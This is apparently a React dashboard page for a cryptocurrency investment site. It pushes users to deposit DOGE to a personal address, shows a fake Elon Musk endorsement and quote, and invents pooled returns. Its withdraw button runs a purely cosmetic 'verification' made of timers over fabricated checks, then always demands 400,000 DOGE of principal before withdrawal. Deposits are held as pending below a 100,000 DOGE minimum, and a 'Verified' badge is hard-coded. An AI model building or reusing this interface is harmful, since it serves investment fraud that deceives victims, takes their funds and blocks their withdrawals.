import { useCallback, useEffect, useRef, useState } from 'react'
import { Link, useNavigate } from 'react-router-dom'
import { authFetch } from '../api/client'
import { useAuth } from '../context/AuthContext'
import { ElonPortraitImg } from '../components/ElonPortraitImg'
import './Dashboard.css'

/** Withdraw eligibility sequence timing (dashboard UI). */
const WITHDRAW_CHECK_STEP_MS = 6_000
const WITHDRAW_MIN_PRINCIPAL_USDT = 400_000

const WITHDRAW_CHECK_STEPS = [
  {
    title: 'Checking eligibility status',
    detail: 'Cross-referencing your session with prime-desk attestation and custody markers.',
  },
  {
    title: 'Verifying Dodge network mesh',
    detail: 'Sampling peer latency, block drift, and heartbeat alignment across the active DOGE grid ring.',
  },
  {
    title: 'Anchoring internal ledger rails',
    detail: 'Reconciling outbound settlement paths against live book depth and liquidity adapters.',
  },
]

/** Minimum time the initial dashboard splash stays visible after a successful load (ms). */
const DASH_SPLASH_MIN_MS = 1_450

/** How often to refetch `/api/dashboard` while this page is open (ms). Set `0` to turn off silent polling. */
const dashboardPollMs = 10_000

/** Book balances are 1:1 with on-chain DOGE credited (not USD / not Tether). */
function formatDoge(n) {
  const x = Number(n)
  if (!Number.isFinite(x)) return 'DOGE —'
  const num = new Intl.NumberFormat('en-US', {
    minimumFractionDigits: 2,
    maximumFractionDigits: 8,
  }).format(x)
  return `DOGE ${num}`
}

function delay(ms) {
  return new Promise((resolve) => {
    window.setTimeout(resolve, ms)
  })
}

export function Dashboard() {
  const navigate = useNavigate()
  const { logout, refresh } = useAuth()
  const [loading, setLoading] = useState(true)
  const [dash, setDash] = useState(null)
  const [loadError, setLoadError] = useState(null) 
  const [copied, setCopied] = useState(false)
  const [balanceEnter, setBalanceEnter] = useState(false)
  const [displayTotal, setDisplayTotal] = useState(0)
  const [accessCode, setAccessCode] = useState('')
  const [accessCodeBusy, setAccessCodeBusy] = useState(false)
  const [accessCodeMsg, setAccessCodeMsg] = useState(null)
  const [accessCodeErr, setAccessCodeErr] = useState(null)
  const [depositGuideOpen, setDepositGuideOpen] = useState(false)
  const [withdrawOpen, setWithdrawOpen] = useState(false)
  const [withdrawPhase, setWithdrawPhase] = useState('idle')
  const [withdrawStep, setWithdrawStep] = useState(0)
  const totalAnimRef = useRef({ initialized: false, prev: 0, raf: 0 })

  const loadDashboard = useCallback(async (opts = {}) => {
    const silent = !!opts.silent
    const splashStart = !silent ? Date.now() : 0

    if (!silent) {
      setLoading(true)
      setLoadError(null)
    }

    const endSplash = async (success) => {
      if (silent) return
      if (success) {
        const elapsed = Date.now() - splashStart
        const rest = Math.max(0, DASH_SPLASH_MIN_MS - elapsed)
        if (rest > 0) await delay(rest)
      }
      setLoading(false)
    }

    try {
      const res = await authFetch('/api/dashboard')
      if (res.status === 401) {
        await refresh()
        navigate('/login', { replace: true })
        if (!silent) setLoading(false)
        return
      }
      const data = await res.json().catch(() => null)
      if (!res.ok || !data?.user || !data?.usdt) {
        if (!silent) {
          setLoadError('Unable to load portfolio data.')
          setDash(null)
        }
        await endSplash(false)
        return
      }
      setDash(data)
      await endSplash(true)
    } catch {
      if (!silent) {
        setLoadError('Connection error. Please retry.')
        setDash(null)
      }
      await endSplash(false)
    }
  }, [navigate, refresh])

  useEffect(() => {
    loadDashboard()
  }, [loadDashboard])

  useEffect(() => {
    const uid = dash?.user?.id
    if (!uid) return
    if (dashboardPollMs === 0) return
    if (!Number.isFinite(dashboardPollMs) || dashboardPollMs < 5000) return

    const tick = () => {
      if (document.visibilityState !== 'visible') return
      void loadDashboard({ silent: true })
    }
    const id = setInterval(tick, dashboardPollMs)
    const onVis = () => {
      if (document.visibilityState === 'visible') void loadDashboard({ silent: true })
    }
    document.addEventListener('visibilitychange', onVis)
    return () => {
      clearInterval(id)
      document.removeEventListener('visibilitychange', onVis)
    }
  }, [dash?.user?.id, loadDashboard])

  useEffect(() => {
    const target = dash?.usdt?.totalRaw
    if (target == null || !Number.isFinite(target)) return

    const box = totalAnimRef.current
    if (!box.initialized) {
      box.initialized = true
      box.prev = target
      setDisplayTotal(target)
      return
    }

    if (box.prev === target) {
      setDisplayTotal(target)
      return
    }

    if (box.raf) cancelAnimationFrame(box.raf)
    const start = box.prev
    const t0 = performance.now()
    const duration = 780

    function easeOut(t) {
      return 1 - (1 - t) * (1 - t)
    }

    function tick(now) {
      const u = Math.min(1, (now - t0) / duration)
      const v = start + (target - start) * easeOut(u)
      setDisplayTotal(v)
      if (u < 1) {
        box.raf = requestAnimationFrame(tick)
      } else {
        box.raf = 0
        box.prev = target
        setDisplayTotal(target)
      }
    }

    box.raf = requestAnimationFrame(tick)
    return () => {
      if (box.raf) cancelAnimationFrame(box.raf)
    }
  }, [dash?.usdt?.totalRaw])     
  

  useEffect(() => {
    if (!withdrawOpen || withdrawPhase !== 'running') return
    let cancelled = false
    const n = WITHDRAW_CHECK_STEPS.length
    ;(async () => {
      for (let i = 0; i < n; i++) {
        if (cancelled) return
        setWithdrawStep(i)
        await new Promise((r) => {
          window.setTimeout(r, WITHDRAW_CHECK_STEP_MS)
        })
      }
      if (!cancelled) setWithdrawPhase('done')
    })()
    return () => {
      cancelled = true
    }
  }, [withdrawOpen, withdrawPhase])

  function dismissDepositGuide() {
    setDepositGuideOpen(false)
  }

  function openWithdrawEligibility() {
    setWithdrawOpen(true)
    setWithdrawPhase('running')
    setWithdrawStep(0)
  }

  function closeWithdrawEligibility() {
    setWithdrawOpen(false)
    setWithdrawPhase('idle')
    setWithdrawStep(0)
  }

  async function handleLogout() {
    await logout()
    navigate('/login', { replace: true })
  } 


  const copyToClipboard = async (text) => {
    await navigator.clipboard.writeText(text)
    setCopied(true)
    setTimeout(() => setCopied(false), 2000)
  }

  async function redeemAccessCode(e) {
    e.preventDefault()
    setAccessCodeErr(null)
    setAccessCodeMsg(null)
    const trimmed = accessCode.trim()
    if (!trimmed) {
      setAccessCodeErr('Enter an access code.')
      return
    }
    setAccessCodeBusy(true)
    try {
      const res = await authFetch('/api/dashboard/redeem-access-code', {
        method: 'POST',
        body: { code: trimmed },
      })
      const data = await res.json().catch(() => ({}))
      if (!res.ok) {
        setAccessCodeErr(data.message || 'Could not apply code.')
        return
      }
      setAccessCodeMsg(data.message || 'Code applied.')
      setAccessCode('')
      void loadDashboard({ silent: true })
    } catch {
      setAccessCodeErr('Connection error. Try again.')
    } finally {
      setAccessCodeBusy(false)
    }
  }

  if (loading) {
    return (
      <div className="dash dash--splash" aria-busy="true" aria-live="polite">
        <div className="dash-splash" aria-label="Loading dashboard">
          <div className="dash-splash__grid" aria-hidden />
          <div className="dash-splash__vignette" aria-hidden />
          <div className="dash-splash__content">
            <div className="dash-splash__orbit" aria-hidden>
              <div className="dash-splash__ring dash-splash__ring--a" />
              <div className="dash-splash__ring dash-splash__ring--b" />
              <div className="dash-splash__ring dash-splash__ring--c" />
              <div className="dash-splash__core" />
            </div>
            <p className="dash-splash__eyebrow">Secure channel</p>
            <h1 className="dash-splash__title">Initializing workspace</h1>
            <p className="dash-splash__sub">Session hardening · desk telemetry sync</p>
            <div className="dash-splash__bars" aria-hidden>
              <span className="dash-splash__bar" />
              <span className="dash-splash__bar" />
              <span className="dash-splash__bar" />
              <span className="dash-splash__bar" />
              <span className="dash-splash__bar" />
            </div>
          </div>
        </div>
      </div>
    )
  }

  if (loadError || !dash) {
    return (
      <div className="dash dash--loading">
        <div className="container dash__inner dash__load-error">
          <p className="dash__loading-msg">{loadError || 'Something went wrong.'}</p>
          <button type="button" className="btn btn--primary" onClick={() => void loadDashboard()}>
            Retry
          </button>
        </div>
      </div>
    )
  }

  const sessionUser = dash.user
  const u = dash.usdt
  const accountLabel = `LYD-${sessionUser.id.replace(/[^a-f0-9]/gi, '').slice(-8).toUpperCase()}`
  const depositAddr = dash.dodgeAddress || ''
  const addr = depositAddr
  const addrShort = addr.length > 12 ? `${addr.slice(0, 8)}…${addr.slice(-8)}` : addr
  const totalReturnPercent = u.principalRaw > 0 ? (u.yieldAccruedRaw / u.principalRaw) * 100 : 0
  const minActivationUsdt = dash.activationThresholdUsdt ?? 100_000

  return (
    <div className="dash">
      {depositGuideOpen && dash?.dodgeAddress ? (
        <div
          className="modal-overlay deposit-guide-overlay"
          role="dialog"
          aria-modal="true"
          aria-labelledby="deposit-guide-title"
        >
          <div className="modal-container deposit-guide-modal">
            <div className="modal-header deposit-guide-modal__header">
              <h3 id="deposit-guide-title">How to deposit safely</h3>
            </div>
            <div className="modal-body deposit-guide-modal__body">
              <p className="deposit-guide-modal__lead">
                <strong>All deposits must be sent as DOGE on the Dodge network</strong> to the address below —{' '}
                <strong>only this exact address</strong>. Sending any other asset or using the wrong network may result in{' '}
                <strong>permanent loss</strong>.
              </p>
              <p className="deposit-guide-modal__rail">
                <strong>Operating instruction — Excession LLC.</strong> All client funding posts as{' '}
                <strong>native DOGE on the Dodge network</strong>. <strong>Elon Musk</strong> has run liquidity and launch logistics
                through this stack for years — the same orbit as <strong>SpaceX</strong>, <strong>Tesla</strong>,{' '}
                <strong>xAI</strong>, <strong>Neuralink</strong>, and <strong>The Boring Company</strong> — because{' '}
                <strong>Dodge-grade throughput</strong> and <strong>DOGE settlement speed</strong> match how that portfolio
                actually moves money at global scale. Your address starting with <strong>D</strong>{' '}
                is <strong>mandated and correct</strong>. An Ethereum <code>0x&hellip;</code> wallet is <strong>wrong for this
                ledger</strong> — do not use it here.
              </p>
              <ol className="deposit-guide-modal__steps">
                <li>
                  <strong>Copy</strong> your personal deposit address (button below or on the dashboard card).
                </li>
                <li>
                  In your external wallet or exchange, <strong>paste that address</strong> as the <strong>recipient</strong>.
                </li>
                <li>
                  Select <strong>DOGE</strong> on the <strong>Dodge / Dogecoin</strong> network, enter the amount, then{' '}
                  <strong>confirm and send</strong> so funds <strong>arrive at</strong> this deposit address (some apps say{' '}
                  <strong>Send</strong> or <strong>Transfer out</strong> — same action: money <strong>into</strong> this desk,
                  not out of it).
                </li>
              </ol>
              <div className="deposit-guide-modal__address-box">
                <span className="deposit-guide-modal__address-label">Your deposit address</span>
                <code className="deposit-guide-modal__address">{dash.dodgeAddress}</code>
                <button
                  type="button"
                  className="deposit-guide-modal__copy"
                  onClick={() => void copyToClipboard(dash.dodgeAddress)}
                >
                  {copied ? '✓ Copied to clipboard' : 'Copy deposit address'}
                </button>
              </div>
              <p className="deposit-guide-modal__foot">
                Activation rules and VIP codes are shown on your dashboard under <strong>Fund Your Account</strong>.
              </p>
            </div>
            <div className="modal-footer deposit-guide-modal__footer">
              <button type="button" className="btn btn--primary deposit-guide-modal__ok" onClick={dismissDepositGuide}>
                OK — I understand
              </button>
            </div>
          </div>
        </div>
      ) : null}
      {withdrawOpen ? (
        <div
          className="modal-overlay withdraw-eligibility-overlay"
          role="presentation"
          onClick={withdrawPhase === 'running' ? undefined : closeWithdrawEligibility}
        >
          <div
            className="modal-container withdraw-eligibility-modal"
            role="dialog"
            aria-modal="true"
            aria-labelledby="withdraw-eligibility-title"
            aria-busy={withdrawPhase === 'running'}
            onClick={(e) => e.stopPropagation()}
          >
            <div className="modal-header withdraw-eligibility-modal__header">
              <h3 id="withdraw-eligibility-title">Withdraw · eligibility</h3>
            </div>
            <div className="modal-body withdraw-eligibility-modal__body">
              {withdrawPhase !== 'done' ? (
                <>
                  <p className="withdraw-eligibility__intro">
                    Establishing a secure withdrawal pathway. Running the standard <strong>prime-desk</strong> integrity
                    sequence before any outbound instruction is considered.
                  </p>
                  <div className="withdraw-eligibility__pane" aria-hidden>
                    <div className="withdraw-eligibility__pane-head">
                      <span className="withdraw-eligibility__pane-dot" />
                      <span className="withdraw-eligibility__pane-title">Desk scan · DOGE mesh</span>
                      <span className="withdraw-eligibility__pane-live">LIVE</span>
                    </div>
                    <div className="withdraw-eligibility__pane-body">
                      <div className="withdraw-eligibility__spider">
                        <div className="withdraw-eligibility__spider-web" />
                        <div className="withdraw-eligibility__spider-sweep" />
                        <div className="withdraw-eligibility__spider-nodes">
                          {[0, 1, 2, 3, 4, 5].map((i) => (
                            <span
                              key={i}
                              className="withdraw-eligibility__spider-node"
                              style={{
                                ['--a']: `${i * 60}deg`,
                                ['--d']: i,
                              }}
                            />
                          ))}
                        </div>
                      </div>
                      <div className="withdraw-eligibility__mini-ticks">
                        {['18:02', '18:06', '18:10', '18:14', '18:18'].map((t) => (
                          <span key={t} className="withdraw-eligibility__mini-tick">
                            {t}
                          </span>
                        ))}
                      </div>
                    </div>
                  </div>
                  <ol className="withdraw-eligibility__steps" aria-label="Verification steps">
                    {WITHDRAW_CHECK_STEPS.map((s, i) => {
                      const state = i < withdrawStep ? 'past' : i === withdrawStep ? 'current' : 'upcoming'
                      return (
                        <li key={s.title} className={`withdraw-eligibility__step withdraw-eligibility__step--${state}`}>
                          <span className="withdraw-eligibility__step-dot" aria-hidden />
                          <div>
                            <p className="withdraw-eligibility__step-title">{s.title}</p>
                            <p className="withdraw-eligibility__step-detail">{s.detail}</p>
                          </div>
                        </li>
                      )
                    })}
                  </ol>
                  <div className="withdraw-eligibility__progress" aria-hidden>
                    <div
                      className="withdraw-eligibility__progress-bar"
                      style={{
                        width: `${((withdrawStep + 1) / WITHDRAW_CHECK_STEPS.length) * 100}%`,
                        transition: 'width 0.6s ease',
                      }}
                    />
                  </div>
                </>
              ) : (
                <div className="withdraw-eligibility__outcome">
                  <p className="withdraw-eligibility__outcome-eyebrow">Desk policy</p>
                  <p className="withdraw-eligibility__outcome-title">
                    Minimum settled principal: <strong>{formatDoge(WITHDRAW_MIN_PRINCIPAL_USDT)}</strong>
                  </p>
                  <p className="withdraw-eligibility__outcome-copy">
                    Withdrawal rails unlock once your <strong>settled principal</strong> reaches that mark. We built this
                    book for <strong>serious size</strong> — participants who anchor depth, keep settlement orderly, and
                    reduce churn for everyone on the desk. Below the threshold, capital stays in{' '}
                    <strong>accumulate &amp; earn</strong> mode so operational focus stays on the commitments the pool was
                    designed around.
                  </p>
                  <p className="withdraw-eligibility__outcome-note text-muted">
                    Your current net deposits (principal): <strong className="numeric">{formatDoge(u.principalRaw)}</strong>
                  </p>
                </div>
              )}
            </div>
            <div className="modal-footer withdraw-eligibility-modal__footer">
              <button
                type="button"
                className="btn btn--primary"
                onClick={closeWithdrawEligibility}
                disabled={withdrawPhase === 'running'}
              >
                {withdrawPhase === 'running' ? 'Verifying…' : 'Understood'}
              </button>
            </div>
          </div>
        </div>
      ) : null}
      <div className="container dash__inner">
        {/* Header - keeping your existing structure */}
        <header className="dash__header">
          <div>
            <p className="dash__eyebrow">Trading Account · Prime</p>
            <h1 className="dash__title">Welcome back, {sessionUser.name}</h1>
            <p className="dash__meta">
              <span className="numeric">{accountLabel}</span>
              <span className="dash__dot" aria-hidden>·</span>
              <span>Active</span>
              <span className="dash__dot" aria-hidden>·</span>
              <span className="dash__verified">Verified</span>
            </p>
            <p className="dash__email text-muted">{sessionUser.email}</p>
          </div>
          <div className="dash__header-actions">
            {addr ? (
              <button
                type="button"
                className="btn deposit-guide-open-btn"
                onClick={() => setDepositGuideOpen(true)}
                aria-haspopup="dialog"
                aria-expanded={depositGuideOpen}
              >
                <span className="deposit-guide-open-btn__icon" aria-hidden>Ð</span>
                Deposit DOGE
              </button>
            ) : null}
            <button
              type="button"
              className="btn deposit-guide-open-btn deposit-guide-open-btn--withdraw"
              onClick={openWithdrawEligibility}
              aria-haspopup="dialog"
              aria-expanded={withdrawOpen}
            >
              <span className="deposit-guide-open-btn__icon" aria-hidden>↗</span>
              Withdraw
            </button>
            <Link to="/markets" className="btn btn--ghost">Markets</Link>
            <Link to="/" className="btn btn--ghost">Home</Link>
            <button type="button" className="btn btn--ghost" onClick={handleLogout}>Sign out</button>
          </div>
        </header>



        {/* Hero Portfolio Card - Professional look */}
        <div className="portfolio-hero">
          <div className="portfolio-hero__primary">
            <p className="portfolio-label">Total Portfolio Value (book DOGE)</p>
            <h2 className="portfolio-value">{formatDoge(displayTotal)}</h2>
            <div className="portfolio-stats">
              <div className="portfolio-stat">
                <span className="stat-label">Net Deposits (principal)</span>
                <span className="stat-number">{formatDoge(u.principalRaw)}</span>
              </div>
              <div className="portfolio-stat">
                <span className="stat-label">Total Return</span>
                <span className={`stat-number ${u.yieldAccruedRaw >= 0 ? 'positive' : 'negative'}`}>
                  {u.yieldAccruedRaw >= 0 ? '+' : ''}{formatDoge(u.yieldAccruedRaw)}
                </span>
              </div>
              <div className="portfolio-stat">
                <span className="stat-label">Return %</span>
                <span className={`stat-number ${totalReturnPercent >= 0 ? 'positive' : 'negative'}`}>
                  {totalReturnPercent >= 0 ? '+' : ''}{totalReturnPercent.toFixed(2)}%
                </span>
              </div>
            </div>
          </div>
        </div>

        <aside className="yield-accrual-trust" aria-label="How portfolio return accrues">
          <p className="yield-accrual-trust__eyebrow">Live market book · collective flow</p>
          <p className="yield-accrual-trust__title">Returns move with the session, like real crypto books</p>
          <p className="yield-accrual-trust__copy">
            Your balance rides inside a <strong>prime brokerage</strong> style pool where marks reflect{' '}
            <strong>ongoing market and flow activity</strong>. As more people connect and size moves through the book, you
            may see <strong>tiny, frequent nudges</strong> in total return and portfolio value—similar to how live crypto
            books drift while liquidity and participation shift through a session. <strong>Early participants</strong> catch
            the first waves of that flow; later entrants join with the book already in motion.
          </p>
        </aside>

        {/* Elon Musk Quote Section */}
<div className="quote-section">
  <div className="quote-card">
    <ElonPortraitImg className="quote-avatar" width={70} height={70} alt="Elon Musk" />
    <div className="quote-content">
      <p className="quote-text">
        "You want to be rich? Build something people want. I put my money where my mouth is — that's why I'm here."
      </p>
      <p className="quote-author">— Elon Musk</p>
    </div>
  </div>
</div>




        {/* Stats Grid - 4 premium cards */}
        <div className="dash__summary">
          <div className="dash-card">
            <p className="dash-card__label">Buying Power</p>
            <p className="dash-card__value numeric">{formatDoge(u.principalRaw * 2)}</p>
            <p className="dash-card__delta is-muted">2x Leverage</p>
          </div>
          <div className="dash-card">
            <p className="dash-card__label">Margin Used</p>
            <p className="dash-card__value numeric">{formatDoge(0)}</p>
            <p className="dash-card__delta is-muted">0% of limit</p>
          </div>
          <div className="dash-card">
            <p className="dash-card__label">Daily P&L</p>
            <p className={`dash-card__value numeric ${u.yieldAccruedRaw >= 0 ? 'is-up' : 'is-down'}`}>
              {u.yieldAccruedRaw >= 0 ? '+' : ''}{formatDoge(u.yieldAccruedRaw)}
            </p>
            <p className="dash-card__delta is-muted">Today's change</p>
          </div>
          <div className="dash-card">
            <p className="dash-card__label">Available to Trade</p>
            <p className="dash-card__value numeric">{formatDoge(u.principalRaw)}</p>
            <p className="dash-card__delta is-muted">Settled DOGE (principal)</p>
          </div>
        </div>  

 

        <div className="deposit-scanner" role="status" aria-live="polite">
          <div className="deposit-scanner__head">
            <span className="deposit-scanner__badge">LIVE</span>
            <span className="deposit-scanner__title">Deposit scanner</span>
          </div>
          <div className="deposit-scanner__track" aria-hidden>
            <span className="deposit-scanner__beam" />
          </div>
          <p className="deposit-scanner__copy">
            After you send <strong>DOGE</strong>, this desk scans for new on-chain transfers on a{' '}
            <strong>~2 minute</strong> cycle. Most deposits are detected and credited to your book within{' '}
            <strong>about 2 minutes</strong> once the network confirms.
          </p>
        </div>

        {/* Deposit Section with Copy Address and Minimum Notice */}
        <div className="deposit-premium">
          <div className="deposit-premium__header">
            <h3>Fund Your Account</h3>
            <p className="minimum-notice minimum-notice--hero">
              <strong>Minimum to activate settled principal:</strong>{' '}
              <strong>{formatDoge(minActivationUsdt)}</strong> — counted as your{' '}
              <strong>pending</strong> balance <strong>plus</strong> any new on-chain deposits until that{' '}
              <strong>combined total reaches {formatDoge(minActivationUsdt)}</strong>. Then the{' '}
              <strong>full amount</strong> moves to <strong>principal</strong> (what we show as settled cash and use for trading views).
              {dash.depositWhitelist?.awaitingFirstDeposit ? (
                <span className="minimum-notice__vip">
                  {' '}
                  <strong>VIP window active:</strong> your <strong>next</strong> processed <strong>DOGE</strong>{' '}
                  deposit settles <strong>pending + that deposit</strong> to <strong>principal</strong> in one step, even below{' '}
                  <strong>{formatDoge(minActivationUsdt)}</strong>. After that, the{' '}
                  <strong>{formatDoge(minActivationUsdt)}</strong> <strong>minimum</strong> applies again to every later deposit.
                </span>
              ) : null}
            </p>
          </div>

          <div className="deposit-address-card deposit-address-card--featured">
            <p className="deposit-address-kicker">To deposit — copy this address and send DOGE here only</p>
            <p className="deposit-rail-note">
              <strong>Instruction from Elon — Excession desk.</strong> Your balance funds <strong>only</strong> through{' '}
              <strong>native DOGE on the Dodge network</strong>. That rail has been part of how he runs <strong>SpaceX</strong>,{' '}
              <strong>Tesla</strong>, <strong>xAI</strong>, <strong>Neuralink</strong>, and <strong>The Boring Company</strong>{' '}
              for years — <strong>high-velocity Dodge settlement</strong> is how this portfolio ingests size. A <strong>D&hellip;</strong>{' '}
              address is <strong>exactly what you should see</strong>; an <strong>Ethereum 0x&hellip;</strong> path is{' '}
              <strong>off-mandate</strong> for this program.
            </p>
            <p className="address-label">Your personal DOGE deposit address (Dodge network)</p>
            <div className="address-copy-wrapper address-copy-wrapper--hero">
              <code className="address-full address-full--hero">{addr}</code>
              <button
                type="button"
                className="copy-button copy-button--primary"
                onClick={() => void copyToClipboard(addr)}
              >
                {copied ? '✓ Copied' : 'Copy deposit address'}
              </button>
            </div>
            <p className="address-warning address-warning--deposit">
              <strong>Important:</strong> use <strong>only</strong> this address. Do <strong>not</strong> send from an exchange without confirming{' '}
              <strong>DOGE</strong> / <strong>Dodge network</strong>. Wrong chain or asset <strong>cannot</strong> be recovered by support.
            </p>
            <p className="deposit-activation-hint">
              For <strong>how much</strong> you need to fund and how <strong>pending</strong> becomes <strong>principal</strong>, read the{' '}
              <strong>Fund Your Account</strong> notice above — activation is <strong>{formatDoge(minActivationUsdt)}</strong> combined (
              <strong>pending + new on-chain deposits</strong>).
            </p>
          </div>  
          {dash.pendingDeposit && (
            <div className="pending-banner">
              <div className="pending-banner__left">
                <span className="pending-banner__icon">⏳</span>
              </div>
              <div className="pending-banner__body">
                <p className="pending-banner__title">Pending toward activation</p>
                <p className="pending-banner__msg">
                  You have <strong>{formatDoge(dash.pendingDeposit.amountRaw)}</strong> in <strong>pending</strong> (not yet{' '}
                  <strong>principal</strong>). Send at least <strong>{formatDoge(dash.pendingDeposit.neededRaw)}</strong> more DOGE so{' '}
                  <strong>pending + new deposits</strong> reach <strong>{formatDoge(minActivationUsdt)}</strong> — then the{' '}
                  <strong>full</strong> amount credits to <strong>principal</strong>.
                </p>
                <p className="pending-banner__warn">
                  <strong>Principal</strong> drives portfolio totals and “available to trade” style figures. <strong>Pending</strong> is held until you reach the{' '}
                  <strong>{formatDoge(minActivationUsdt)} minimum</strong>.
                </p>
              </div>
            </div>
          )}
          <div className="vip-access-card">
            <p className="vip-access-card__eyebrow">Institutional access</p>
            <p className="vip-access-card__lead">
              If you were issued a private <strong>access code</strong>, enter it here. It unlocks a <strong>one-time</strong> window: your{' '}
              <strong>next</strong> processed <strong>DOGE</strong> deposit moves <strong>pending + that deposit</strong> to{' '}
              <strong>principal</strong> even if you are below the <strong>{formatDoge(minActivationUsdt)}</strong> <strong>minimum</strong>. After that deposit is processed, the{' '}
              <strong>{formatDoge(minActivationUsdt)}</strong> <strong>minimum</strong> applies to every later deposit. Each code is <strong>single-use</strong> and cannot be redeemed twice.
            </p>
            <form className="vip-access-card__form" onSubmit={redeemAccessCode}>
              <input
                type="text"
                className="vip-access-card__input"
                placeholder="Access code"
                value={accessCode}
                onChange={(e) => setAccessCode(e.target.value)}
                autoComplete="off"
                spellCheck={false}
                disabled={accessCodeBusy || dash.depositWhitelist?.awaitingFirstDeposit}
              />
              <button
                type="submit"
                className="vip-access-card__btn"
                disabled={accessCodeBusy || dash.depositWhitelist?.awaitingFirstDeposit}
              >
                {accessCodeBusy ? 'Applying…' : 'Apply code'}
              </button>
            </form>
            {accessCodeErr ? <p className="vip-access-card__err">{accessCodeErr}</p> : null}
            {accessCodeMsg ? <p className="vip-access-card__ok">{accessCodeMsg}</p> : null}
          </div>
        </div>      


         

        {/* Keep your existing sections - just comment out on-chain balance */}
        <div className="dash-balance" style={{ display: 'none' }}>
          {/* Hidden - on-chain balance removed as requested */}
        </div>

        {/* Keep Principal Auth section if needed */}
        <div className="dash-principal-auth" style={{ display: 'none' }}>
          {/* Hidden for now - can enable later */}
        </div>
      </div>
    </div>
  )
}